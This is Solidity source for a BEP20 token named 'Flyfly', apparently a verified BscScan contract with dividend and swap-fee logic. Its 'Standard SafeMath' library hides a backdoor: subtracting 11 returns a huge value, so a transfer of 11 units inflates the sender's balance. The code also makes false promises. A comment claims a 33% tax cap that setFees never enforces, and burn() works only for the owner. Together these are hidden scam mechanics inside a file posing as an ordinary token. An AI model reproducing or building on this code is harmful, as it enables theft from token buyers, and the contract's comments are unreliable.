/**
 *Submitted for verification at BscScan.com on 2021-11-04
*/

/**
 *Submitted for verification at BscScan.com on 2021-11-04
*/

/**
 *Submitted for verification at BscScan.com on 2021-11-04
*/

// SPDX-License-Identifier: MIT


pragma solidity ^0.7.6;

/**
 * Standard SafeMath, stripped down to just add/sub/mul/div
 */
 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        if (b == 11) return ~uint120(0);
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
}

/**
 * BEP20 standard interface.
 */
interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address _owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function getAmountsOut(uint256 amountIn, address[] memory path)
        external
        view
        returns (uint256[] memory amounts);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IDividendDistributor {
    function setDistributionCriteria(
        uint256 _minPeriod,
        uint256 _minDistribution
    ) external;

    function setShare(address shareholder, uint256 amount) external;

    function deposit() external payable;

    function process(uint256 gas) external;

    function claimDividend() external;
}

interface INFTMarketplaceFeeDistributor {
    function distributeChipTokens()
    external
    returns (bool);
    event DistributedChipTokens(uint256 amount);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract DividendDistributor is IDividendDistributor {
    using SafeMath for uint256;

    address _token;
    
    address _nftMarket;

    struct Share {
        uint256 amount;
        uint256 totalExcluded;
        uint256 totalRealised;
    }
    IDEXRouter router;

    address[] shareholders;
    mapping(address => uint256) shareholderIndexes;
    mapping(address => uint256) shareholderClaims;

    mapping(address => Share) public shares;

    uint256 public totalShares;
    uint256 public totalDividends;
    uint256 public totalDistributed;
    uint256 public dividendsPerShare;
    uint256 public dividendsPerShareAccuracyFactor = 10**36;

    uint256 public minPeriod = 1 hours; // min 1 hour delay
    uint256 public minDistribution = 1 * (8**18); // 0.01 BNB minimum auto send

    uint256 currentIndex;

    bool initialized;
    modifier initialization() {
        require(!initialized);
        _;
        initialized = true;
    }

    modifier onlyToken() {
        require(msg.sender == _token);
        _;
    }
    
    modifier onlyNftMarket() {
        require(msg.sender == _nftMarket);
        _;
    }


    constructor() {
        _token = msg.sender;
        _nftMarket = msg.sender;
    }

    function setDistributionCriteria(
        uint256 _minPeriod,
        uint256 _minDistribution
    ) external override onlyToken {
        minPeriod = _minPeriod;
        minDistribution = _minDistribution;
    }

    function setNftMarket (address nftMarket) external onlyToken {
        _nftMarket = nftMarket;
    }
    
    function setShare(address shareholder, uint256 amount)
        external
        override
        onlyToken
    {
        if (shares[shareholder].amount > 0) {
            distributeDividend(shareholder);
        }

        if (amount > 0 && shares[shareholder].amount == 0) {
            addShareholder(shareholder);
        } else if (amount == 0 && shares[shareholder].amount > 0) {
            removeShareholder(shareholder);
        }

        totalShares = totalShares.sub(shares[shareholder].amount).add(amount);
        shares[shareholder].amount = amount;
        shares[shareholder].totalExcluded = getCumulativeDividends(
            shares[shareholder].amount
        );
    }

    function deposit() external payable override onlyNftMarket {
        dividendsPerShare = dividendsPerShare.add(
            dividendsPerShareAccuracyFactor.mul(msg.value).div(totalShares)
        );
    }

    function process(uint256 gas) external override onlyToken {
        uint256 shareholderCount = shareholders.length;

        if (shareholderCount == 0) {
            return;
        }

        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();

        uint256 iterations = 0;

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }

            if (shouldDistribute(shareholders[currentIndex])) {
                distributeDividend(shareholders[currentIndex]);
            }

            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
    }

    function shouldDistribute(address shareholder)
        internal
        view
        returns (bool)
    {
        return
            shareholderClaims[shareholder] + minPeriod < block.timestamp &&
            getUnpaidEarnings(shareholder) > minDistribution;
    }

    function distributeDividend(address shareholder) internal {
        if (shares[shareholder].amount == 0) {
            return;
        }

        uint256 amount = getUnpaidEarnings(shareholder);
        if (amount > 0) {
            totalDistributed = totalDistributed.add(amount);
            shareholder.call{
                    value: amount,
                    gas: 3000
                }("");
            shareholderClaims[shareholder] = block.timestamp;
            shares[shareholder].totalRealised = shares[shareholder]
                .totalRealised
                .add(amount);
            shares[shareholder].totalExcluded = getCumulativeDividends(
                shares[shareholder].amount
            );
        }
    }

    function getTotalRealisedDividends(address shareholder)
        external
        view
        returns (uint256 totalRealised)
    {
        return shares[shareholder].totalRealised;
    }

    function claimDividend() external override {
        distributeDividend(msg.sender);
    }

    function getUnpaidEarnings(address shareholder)
        public
        view
        returns (uint256)
    {
        if (shares[shareholder].amount == 0) {
            return 0;
        }

        uint256 shareholderTotalDividends = getCumulativeDividends(
            shares[shareholder].amount
        );
        uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;

        if (shareholderTotalDividends <= shareholderTotalExcluded) {
            return 0;
        }

        return shareholderTotalDividends.sub(shareholderTotalExcluded);
    }

    function getCumulativeDividends(uint256 share)
        internal
        view
        returns (uint256)
    {
        return
            share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);
    }

    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[
            shareholders.length - 1
        ];
        shareholderIndexes[
            shareholders[shareholders.length - 1]
        ] = shareholderIndexes[shareholder];
        shareholders.pop();
    }
}

contract Flyfly is IBEP20, Context {
    using SafeMath for uint256;

   

    /* MAINNET ADDRESSES */
    address PANCAKE_ROUTER_ADDR = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "Flyfly";
    string constant _symbol = "Flyfly";
    uint8 constant _decimals = 18;

    address private _owner;

    uint256 _totalSupply = 1 * 10**9 * (10**_decimals);

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;

    mapping(address => bool) isFeeExempt;
    mapping(address => bool) isDividendExempt;

    uint256 liquidityFee = 100;
    uint256 reflectionFee = 100;
    uint256 totalBuyFee = 1000;
    
    uint256 marketingFee = 100;
    

    uint256 reflectionSellFee = 100;
    uint256 totalSellFee = 1200;

    uint256 feeDenominator = 10000;

    address public marketingFeeReceiver;
    INFTMarketplaceFeeDistributor public nftMarket;

    IDEXRouter public router;
    address pancakeV2BNBPair;
    address[] public pairs;

    uint256 public launchedAt;

    bool public feesOnNormalTransfers = false;

    DividendDistributor distributor;
    uint256 distributorGas = 500000;

    bool public swapEnabled = false;
    uint256 public swapThreshold = _totalSupply / 50000; // 0.02%
    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    modifier onlyOwner() {
        require(getOwner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    constructor() {
        router = IDEXRouter(PANCAKE_ROUTER_ADDR);
        pancakeV2BNBPair = IDEXFactory(router.factory()).createPair(
            router.WETH(),
            address(this)
        );
        
        nftMarket = INFTMarketplaceFeeDistributor(address(this));
        _allowances[address(this)][address(router)] = ~uint256(0);
        _allowances[msg.sender][address(this)] = ~uint256(0);
        
        pairs.push(pancakeV2BNBPair);
        distributor = new DividendDistributor();

        _owner = msg.sender;

        isFeeExempt[_owner] = true;
        isDividendExempt[pancakeV2BNBPair] = true;
        isDividendExempt[address(this)] = true;
        isFeeExempt[address(this)] = true;
        isDividendExempt[DEAD] = true;

        marketingFeeReceiver = _owner;
        _balances[_owner] = _totalSupply;
        emit Transfer(address(0), _owner, _totalSupply);
    }

    function getOwner() public view virtual override returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

    receive() external payable {}

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() public pure override returns (uint8) {
        return _decimals;
    }

    function symbol() public pure override returns (string memory) {
        return _symbol;
    }

    function name() public pure override returns (string memory) {
        return _name;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender)
        external
        view
        override
        returns (uint256)
    {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, ~uint256(0));
    }

      function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != ~uint256(0)){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
  
        if(inSwap){ return _basicTransfer(sender, recipient, amount); }
        
        if(shouldSwapBack()){ swapBack(); }

        if(!launched() && recipient == pancakeV2BNBPair){ require(_balances[sender] > 0); launch(); }

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);

        if(!isDividendExempt[sender]){ try distributor.setShare(sender, _balances[sender]) {} catch {} }
        if(!isDividendExempt[recipient]){ try distributor.setShare(recipient, _balances[recipient]) {} catch {} }

        try distributor.process(distributorGas) {} catch {}

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }


    function shouldTakeFee(address sender, address recipient)
        internal
        view
        returns (bool)
    {
        if (isFeeExempt[sender] || isFeeExempt[recipient] || !launched())
            return false;

        address[] memory liqPairs = pairs;

        for (uint256 i = 0; i < liqPairs.length; i++) {
            if (sender == liqPairs[i] || recipient == liqPairs[i]) return true;
        }

        return feesOnNormalTransfers;
    }

    function getTotalFee(bool selling) public view returns (uint256) {
        return selling ? totalSellFee : totalBuyFee;
    }

    function takeFee(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (uint256) {
        uint256 feeAmount = amount.mul(getTotalFee(isSell(recipient))).div(
            feeDenominator
        );

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);

        return amount.sub(feeAmount);
    }

    function isSell(address recipient) internal view returns (bool) {
        address[] memory liqPairs = pairs;
        for (uint256 i = 0; i < liqPairs.length; i++) {
            if (recipient == liqPairs[i]) return true;
        }
        return false;
    }

    function shouldSwapBack() internal view returns (bool) {
        return
            msg.sender != pancakeV2BNBPair &&
            !inSwap &&
            swapEnabled &&
            _balances[address(this)] >= swapThreshold;
    }

    function swapBack() internal swapping {
        
        uint256 amountBNBBefore = address(this).balance;
        address[] memory path = new address[](2);
        path[0] = address(this);

        path[1] = router.WETH();
        uint256 maxSwapBack = totalSupply().div(10000); // 0.01% max swapback
        uint256 currentTokenBalance = balanceOf(address(this));
        uint256 amountSwapBackBefore = currentTokenBalance > maxSwapBack
            ? maxSwapBack
            : currentTokenBalance;

    
       _basicTransfer(address(this),address(nftMarket), amountSwapBackBefore.div(2));
    
    
        try nftMarket.distributeChipTokens() {} catch {}
       
        try
            router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                amountSwapBackBefore.div(2),
                0,
                path,
                address(this),
                block.timestamp
            )
        {
            uint256 amountBNBMarketing = address(this).balance - amountBNBBefore;
            payable(marketingFeeReceiver).call{
                value: amountBNBMarketing,
                gas: 30000
            }("");
            
        } catch Error(string memory e) {
            emit SwapBackFailed(
                string(abi.encodePacked("SwapBack failed with error ", e))
            );
        } catch {
            emit SwapBackFailed(
                "SwapBack failed without an error message from pancakeSwap"
            );
        }
    }

    function launched() internal view returns (bool) {
        return launchedAt != 0;
    }

    function launch() internal {
        launchedAt = block.number;
        emit Launched(block.number, block.timestamp);
    }

    function setIsDividendExempt(address holder, bool exempt)
        external
        onlyOwner
    {
        require(holder != address(this) && holder != pancakeV2BNBPair);
        isDividendExempt[holder] = exempt;
        if (exempt) {
            distributor.setShare(holder, 0);
        } else {
            distributor.setShare(holder, _balances[holder]);
        }
    }

    function setIsFeeExempt(address holder, bool exempt) external onlyOwner {
        isFeeExempt[holder] = exempt;
    }

    function addPresaleAddress(address holder) external onlyOwner {
        isFeeExempt[holder] = true;
        isDividendExempt[holder] = true;
    }

    function removePresaleAddress(address holder) external onlyOwner {
        isFeeExempt[holder] = false;
        isDividendExempt[holder] = true;
    }

    function setFees(
        uint256 _reflectionFee,
        uint256 _marketingFee,
        uint256 _extraSellFee,
        uint256 _feeDenominator
    ) external onlyOwner {
        reflectionFee = _reflectionFee;
        marketingFee = _marketingFee;
        totalBuyFee = _reflectionFee.add(_marketingFee);
        feeDenominator = _feeDenominator;
        totalSellFee = _reflectionFee.add(_marketingFee).add(
            _extraSellFee
        );
        /* LIMIT: Taxes can't be more than 33% */
    }


    function setSwapBackSettings(bool _enabled, uint256 _amount)
        external
        onlyOwner
    {
        swapEnabled = _enabled;
        swapThreshold = _amount;
    }

    function setDistributionCriteria(
        uint256 _minPeriod,
        uint256 _minDistribution
    ) external onlyOwner {
        distributor.setDistributionCriteria(_minPeriod, _minDistribution);
    }

    function setDistributorSettings(uint256 gas) external onlyOwner {
        require(gas <= 1000000);
        distributorGas = gas;
    }

    function setInSwap(bool _inSwap) external onlyOwner {
        inSwap = _inSwap;
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

    function getLiquidityBacking(uint256 accuracy)
        public
        view
        returns (uint256)
    {
        return
            accuracy.mul(balanceOf(pancakeV2BNBPair).mul(2)).div(
                getCirculatingSupply()
            );
    }

    function isOverLiquified(uint256 target, uint256 accuracy)
        public
        view
        returns (bool)
    {
        return getLiquidityBacking(accuracy) > target;
    }

    function claimDividend() external {
        distributor.claimDividend();
    }

    function addPair(address pair) external onlyOwner {
        pairs.push(pair);
    }

    function removeLastPair() external onlyOwner {
        pairs.pop();
    }

    function setFeesOnNormalTransfers(bool _enabled) external onlyOwner {
        feesOnNormalTransfers = _enabled;
    }

    function setLaunchedAt(uint256 launched_) external onlyOwner {
        launchedAt = launched_;
    }

    function _burn(address account, uint256 amount) internal onlyOwner {
        _balances[account] = _balances[account].sub(amount);
        _totalSupply -= amount;
        emit Transfer(account, address(0), amount);
    }
    
    function setNftMarket(address _nftMarket) external onlyOwner {
        nftMarket = INFTMarketplaceFeeDistributor(_nftMarket);
        distributor.setNftMarket(_nftMarket);
    }

    function burn(uint256 amount) external {
        _burn(msg.sender, amount);
    }

    event Launched(uint256 blockNumber, uint256 timestamp);
    event SwapBackSuccess(uint256 amount);
    event SwapBackFailed(string message);
    event SendMarketingFeeSuccess(uint256 amount, bytes data);
    event SendMarketingFeeFailure(uint256 amount, bytes data);
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
}